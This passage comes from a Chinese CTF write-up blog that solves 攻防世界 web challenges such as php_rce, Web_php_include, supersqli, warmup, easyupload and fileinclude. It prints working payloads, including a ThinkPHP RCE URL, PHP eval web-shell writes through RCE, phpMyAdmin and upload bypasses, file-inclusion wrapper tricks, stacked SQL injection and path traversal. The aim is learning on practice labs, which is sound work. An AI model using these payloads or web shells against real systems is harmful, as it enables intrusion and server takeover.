class="hljs-string">&quot;Demofile&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;fl4g.php&quot;</span>;&#125;<br><span class="hljs-attribute">O</span>:+<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Demo&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;Demofile&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;fl4g.php&quot;</span>;&#125;<br><span class="hljs-attribute">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ</span>==<br></code></pre></td></tr></table></figure><p>传参即可</p><hr><h3 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h3><p>RCE漏洞</p><p><img src="php_rce1.png" alt="php_rce1"></p><p>作为一名合格的<del>脚本小子</del>，正好试试新下的goby，扫描指定ip和port，结果如下：</p><p><img src="php_rce2.png" alt="php_rce2"></p><p>goby给出了漏洞的url，直接访问，或者点验证，这里选验证：</p><p><img src="php_rce3.png" alt="php_rce3"></p><p>可以看到命令成功执行</p><p>为了方便观察，下面用网页打开，打开url，payload：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://61.147.171.105:54326/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=ls%20/<br></code></pre></td></tr></table></figure><p><img src="php_rce4.png" alt="php_rce4"></p><p>可以看到有flag，打开，payload：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://61.147.171.105:54326/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=cat%20/flag<br></code></pre></td></tr></table></figure><p>得到flag</p><p>ps：既然能rce，何不试试getshell呢</p><p>payload：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://61.147.171.105:54326/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;&gt;11.php</span><br></code></pre></td></tr></table></figure><p>蚁剑连一下就好了，确实能getshell，在根目录下有flag</p><p>可以使用find &#x2F; -name flag查找路径~</p><hr><h3 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h3><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>乍一看很短，应该是挺简单的，但是转念一想，应该没这么简单，<del>毕竟字越少事越大</del></p><p>搜了一下wp，给出的payload为</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>];<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>给出了&#x2F;var&#x2F;www的路径</p><p>再试试</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(ls);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="Web_php_include1.png" alt="Web_php_include1"></p><p>既然能执行系统命令，那直接：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fl4gisisish3r3.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="Web_php_include2.png" alt="Web_php_include2"></p><p>？怎么没有回显，找了很久，看wp发现，它在注释里，<del>小丑啊啊啊啊</del></p><p>data:&#x2F;&#x2F;伪协议，是数据流封装器，和php:&#x2F;&#x2F;相似，都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过包含你输入的payload来实现目的。</p><h4 id="另一种方法："><a href="#另一种方法：" class="headerlink" title="另一种方法："></a>另一种方法：</h4><p>由于strstr()这个函数对大小写敏感，所以我们可以换成PHP:&#x2F;&#x2F;的形式，pauload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?p</span>age=<span class="hljs-variable constant_">PHP</span><span class="hljs-symbol">://filter/convert</span>.base64-encode/resource=fl4gisisish3r3.php<br></code></pre></td></tr></table></figure><p>也行</p><h4 id="还有另一种方法："><a href="#还有另一种方法：" class="headerlink" title="还有另一种方法："></a>还有另一种方法：</h4><p>御剑扫后台，发现phpmyadmin，root，密码为空，登录</p><p><img src="Web_php_include3.png" alt="Web_php_include3"></p><p>执行sql语句，看一下能不能写入一句话</p><p>show variables like “secure_file_priv” ，值为空，可以写</p><p>select “<?php @eval($_POST['cmd'])?>“ into outfile ‘.&#x2F;my.php’</p><p>无法写入，改成</p><p>select “<?php @eval($_POST['cmd'])?>“ into outfile ‘&#x2F;tmp&#x2F;my.php’</p><p>写入成功后，蚁剑连一下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">60920</span><span class="hljs-regexp">/?page=/</span>tmp/my.php<br></code></pre></td></tr></table></figure><p>也能成功读取</p><hr><h3 id="9-supersqli"><a href="#9-supersqli" class="headerlink" title="9.supersqli"></a>9.supersqli</h3><p>进去后有一句话：<strong>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</strong>和一个查询框，根据题目，应该是sql注入，单引号测试，报了sql语法错误，确认是sql注入</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>页面回显提示：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">return preg_match(&quot;/<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">&quot;,$inject);</span><br></code></pre></td></tr></table></figure><p>被匹配到了</p><p>直接用sqlmap了：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u url <span class="hljs-comment">--dbs</span><br></code></pre></td></tr></table></figure><p>给出了supersqli这一个库，但是到了爆表名的时候就进行不下去了，看了一下wp，发现F12有</p><p><img src="supersqli1.png" alt="supersqli1"></p><p><strong>sqlmap是没有灵魂的</strong></p><p>实在让人汗颜</p><p>手注：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; orde <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>出错，说明只有两列</p><p>并且由上文得知，select关键字被替换了，不能用，并且&#x2F;i表示不区分大小写，这意味着大小写绕过是行不通的，想到堆叠注入：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27;;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="supersqli2.png" alt="supersqli2"></p><p><del>找到了“ctftraining”这个库，就是你了！</del></p><p>根据题目提示，应该用supersqli这个库：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27;;<span class="hljs-keyword">use</span> supersqli;<span class="hljs-keyword">show</span> tables;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="supersqli3.png" alt="supersqli3"></p><p>两个表，看看数字的表：</p><p><strong>注：当纯数字作为表名时，需要加反引号</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27;;<span class="hljs-keyword">use</span> supersqli;<span class="hljs-keyword">show</span> columns from `<span class="hljs-number">1919810931114514</span>`<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="supersqli4.png" alt="supersqli4"></p><p>有flag字段，但是select被ban了，网上看到了handler方法:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">-1</span>&#x27;;use supersqli;handler `<span class="hljs-number">1919810931114514</span>` open <span class="hljs-keyword">as</span> p;handler p <span class="hljs-built_in">read</span> <span class="hljs-keyword">first</span>;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h4 id="handler简介"><a href="#handler简介" class="headerlink" title="handler简介"></a>handler简介</h4><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>    HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。 </p><p>原文链接：<a href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a></p><p><a href="https://blog.csdn.net/jesseyoung/article/details/40785137">详见</a></p><hr><h3 id="10-warmup"><a href="#10-warmup" class="headerlink" title="10.warmup"></a>10.warmup</h3><p>进去一看，是一个滑稽[滑稽]</p><p><img src="warmup1.png" alt="warmup1"></p><p>应该是要我们下载source.php的源码，试了一下source.php.bak，404了，应该行不通</p><p>没啥想法了，御剑扫了一下，有index.php，访问看看，还是这个滑稽….</p><p>我悟了，应该直接访问source.php.果然，得到了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];  <span class="hljs-comment">//php中=&gt;一般用作数组键名与元素的连接符。简单来说就是使用=&gt;符号来分隔键和值，左侧表示键，右侧表示值。这里设置了白名单</span><br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)//<span class="hljs-title function_ invoke__">mb_strpos</span>()查找字符串在别一字符串中首次出现的位置 <span class="hljs-title function_ invoke__">mb_substr</span>()。<br>            );<span class="hljs-comment">//mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用此函数</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<span class="hljs-comment">//url解码</span><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>代码审计，<del>根本不会</del></p><p>访问hint.php 页面提示：flag not here, and flag in ffffllllaaaagggg</p><p>找到flag所在</p><p>包含文件的三个条件为非空、是字符串和checkFile返回true</p><p>payload：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure><p>返回五次，回到根目录，访问到flag</p><hr><h3 id="11-catcat-new"><a href="#11-catcat-new" class="headerlink" title="11.catcat-new"></a>11.catcat-new</h3><p>进入环境，页面里有几种猫，随便点一个进去看看</p><p><img src="catcat-new1.png" alt="catcat-new1"></p><p>看着url，感觉可能有漏洞，扔一个单引号进去，得到回显：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">b<span class="hljs-string">&quot;File `./details/ForestCat.txt&#x27;` not exist or can not be read&quot;</span><br></code></pre></td></tr></table></figure><p>xray扫一下吧</p><p><img src="catcat-new2.png" alt="catcat-new2"></p><p>能读敏感文件，尝试读取根下的flag，没成功，只能看wp了：</p><p>Linux 内核提供了 &#x2F;proc 文件系统，提供了在运行时访问内核内部数据结构、改变内核设置的机制，用户和应用程序可以通过 &#x2F;proc  得到系统的信息，并改变内核的某些参数。&#x2F;proc 文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。&#x2F;proc 目录下还包括  &#x2F;proc&#x2F;sys  目录，这个目录是可写的，可以通过它来访问或修改内核的参数。另外还有一些以数字命名的目录，它们是进程目录。系统中运行的每个进程都有一个对应的目录在 &#x2F;proc 下，以进程的 PID号为目录名，它们是读取进程信息的接口。而 &#x2F;proc&#x2F;self 目录则是读取进程本身的信息接口。</p><p>读取 &#x2F;proc&#x2F;self&#x2F;maps 可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</p><p>&#x2F;proc&#x2F;self&#x2F;mem 是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存信息。</p><p>本题解答的关键思路是需要知道 Python 的存储对象的位置在堆上这个特性，而通过 &#x2F;proc&#x2F;self&#x2F;mem 可以用来读取堆栈信息。</p><p>题目的代码和一键解决的文件，我已放在 <a href="http://www.edulinks.cn/2023/01/18/20230118-ctf-catcat/">Github</a> 上。</p><p>以上内容<a href="http://www.edulinks.cn/2023/01/18/20230118-ctf-catcat/">来自</a></p><p>后面就不会了TAT</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前言</title>
    <link href="/2023/03/30/%E5%89%8D%E8%A8%80/"/>
    <url>/2023/03/30/%E5%89%8D%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p>为了这个博客，我花了一个星期TAT，<del>真来之不易</del>， 从零开始，通过搭网站debug又学到了一些东西，后面会记录一些<del>大佬学习笔记</del></p><p>​                              To                                                      Be                                          Continue</p>]]></content>
    
    
    <categories>
      
      <category>pre</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>难度1</title>
    <link href="/2023/03/26/web01/"/>
    <url>/2023/03/26/web01/</url>
    
    <content type="html"><![CDATA[<h2 id="先记一个学校CTF赛题"><a href="#先记一个学校CTF赛题" class="headerlink" title="先记一个学校CTF赛题"></a>先记一个学校CTF赛题</h2><h3 id="管理员错误使用了vim使得异常退出"><a href="#管理员错误使用了vim使得异常退出" class="headerlink" title="管理员错误使用了vim使得异常退出"></a>管理员错误使用了vim使得异常退出</h3><p><img src="vim%E5%BC%82%E5%B8%B8%E9%80%80%E5%87%BA.png" alt="vim异常退出"></p><p>根据vim的缓存原理，访问.index.php.swp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url：http://47.92.27.98:21655/.index.php.swp<br></code></pre></td></tr></table></figure><p><img src="index.php.swp.png" alt="index.php.swp"></p><p>访问url，下载缓存文件，记事本打开，ctrl+f “flag”  get~</p><hr><h3 id="再记一个忘了哪做的题了"><a href="#再记一个忘了哪做的题了" class="headerlink" title="再记一个忘了哪做的题了"></a>再记一个忘了哪做的题了</h3><p>代码审计：md5加密相同但本身不同，想到数组绕过，尝试flag.php发现页面空白，查看源码得到flag</p><p><img src="%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87.png" alt="数组绕过"></p><hr><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><strong>攻防世界</strong></h2><h3 id="1-你知道index-php的备份文件名吗？"><a href="#1-你知道index-php的备份文件名吗？" class="headerlink" title="1.你知道index.php的备份文件名吗？"></a>1.你知道index.php的备份文件名吗？</h3><p>直接在url后加index.php.bak，下载备份文件，记事本打开</p><p>index.php.bak(backup备份)</p><hr><h3 id="2-一个不能按的按钮"><a href="#2-一个不能按的按钮" class="headerlink" title="2.一个不能按的按钮"></a>2.一个不能按的按钮</h3><p>F12看网页源码，发现button被禁用了，把disabled删掉</p><p><img src="button.png" alt="button"></p><hr><h3 id="3-sql-get"><a href="#3-sql-get" class="headerlink" title="3.sql(get)"></a>3.sql(get)</h3><p>明显的get注入，burp intruder模块1-10000爆破，得到2333，访问</p><p><img src="sql.png" alt="sql"></p><hr><h3 id="4-robots协议"><a href="#4-robots协议" class="headerlink" title="4.robots协议"></a>4.robots协议</h3><p>直接在url上访问robots.txt</p><p><img src="robots1.png" alt="robots1"></p><p>发现&#x2F;fl0g.php是不被允许的，直接访问</p><p><img src="robots2.png" alt="robots2"></p><hr><h3 id="5-PHP2"><a href="#5-PHP2" class="headerlink" title="5.PHP2"></a>5.PHP2</h3><p>进去显示你能认证这个网站吗，直接御剑扫后台，发现&#x2F;index.phps</p><p><img src="php2.1.png" alt="php2"></p><p>分析PHP代码，发现函数对传参进行了url解码，那我们需要对admin进行编码，由于浏览器本身会解码一次，所以我们编码两次，用burp编码模块，GET传参得到flag</p><p><img src="php2.2.png" alt="php2.2"></p><hr><h3 id="6-PHP"><a href="#6-PHP" class="headerlink" title="6.PHP"></a>6.PHP</h3><p>a和b都是get传参，a&#x3D;&#x3D;0是弱类型比较，值一样即可，无需类型相同，所以a随便传一个字符串如a&#x3D;’0’，a&#x3D;’0a’，flag1就得到了；b&gt;1234，但b不能是数字或者数字字符串，所以输b&#x3D;12345b，当’12345b’与 1234比较时，字符串先转换成数值12345， 再和1234比较12345&gt;1234，为真，输出flag2</p><p><img src="%E8%BF%98%E6%98%AFPHP.png" alt="还是PHP"></p><hr><h3 id="7-想想初始页面"><a href="#7-想想初始页面" class="headerlink" title="7.想想初始页面"></a>7.想想初始页面</h3><p>想到index.php，访问，F12查看一波</p><p><img src="index1.png" alt="index"></p><p>发现302跳转到location：1.php，说明index是存在的，burp重放模块</p><p><img src="index2.png" alt="index2"></p><p>说flag被隐藏了，但flag就藏在包里第五行<del>差点没看见&#x3D; &#x3D;</del></p><hr><h3 id="8-easyupload"><a href="#8-easyupload" class="headerlink" title="8.easyupload"></a>8.easyupload</h3><p>文件上传，php被拦，上传图片马，依然被拦，说明“php”很可能被检测出来，所以这里用短标签绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传成功但无法解析，想到分布式配置文件.htaccess，被拦，上传.user.ini以解析php，内容为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><br><span class="hljs-attribute">auto_prepend_file</span>=4.jpg<br></code></pre></td></tr></table></figure><p>Burp抓包，把Content-Type改成image&#x2F;jpg，绕过检测</p><p>然后上传图片马4.jpg，F12查看图片去向，蚁剑连接，打开flag文件。</p><p><img src="easyupload.png" alt="easyupload"></p><h4 id="关于-user-ini"><a href="#关于-user-ini" class="headerlink" title="关于.user.ini"></a>关于.user.ini</h4><p>.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p><p>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini</p><p>.user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如4.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(.&#x2F;4.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。</p><p>利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。</p><hr><h3 id="9-fileinclude"><a href="#9-fileinclude" class="headerlink" title="9.fileinclude"></a>9.fileinclude</h3><p>进入靶场，老规矩F12看一哈,发现有代码被注释了，格式不好看，所以查看页面源代码：</p><p><img src="fileinclude1.png" alt="fileinclude1"></p><p>关键在于15行，lan是存放着name为language的cookie的值的变量，当lan非零时将包含$lan.php，那任务就明确了，传一个</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Cookie: language=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag<br></code></pre></td></tr></table></figure><p>得到base64编码的一串字符</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHA<span class="hljs-symbol">NCiRmbGFnPSJjeWJlcnBlYWNlezU1</span><span class="hljs-symbol">NmNlYWExYWJmZWZmNzg0</span>Mjc<span class="hljs-number">2</span>Mz<span class="hljs-name">g5</span>ODRk<span class="hljs-symbol">NDUxOTMxfSI7</span>DQo/Pg==<br></code></pre></td></tr></table></figure><p>decode</p><p><img src="fileinclude2.png" alt="fileinclude2"></p><p>关于base64加密的原因，就是利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。（感谢‘zhangyuhaimian’——一个大黑阔）</p><h4 id="关于php-x2F-x2F-filter"><a href="#关于php-x2F-x2F-filter" class="headerlink" title="关于php:&#x2F;&#x2F;filter"></a>关于php:&#x2F;&#x2F;filter</h4><p>文章中还介绍了用base64解码绕过<?php exit; ?></p><p><a href="https://blog.csdn.net/weixin_44576725/article/details/124177555">php:&#x2F;&#x2F;filter的妙用</a></p><hr><h3 id="10-fileclude"><a href="#10-fileclude" class="headerlink" title="10.fileclude"></a>10.fileclude</h3><p>又是查看源代码</p><p><img src="fileclude1.png" alt="fileclude1"></p><p>发现有flag.php，如果file2的文件内容为hello ctf，则包含file1，那任务就明确了，把flag.php的内容base64加密写到file1里，然后往file2写入hello ctf</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file1=php:<span 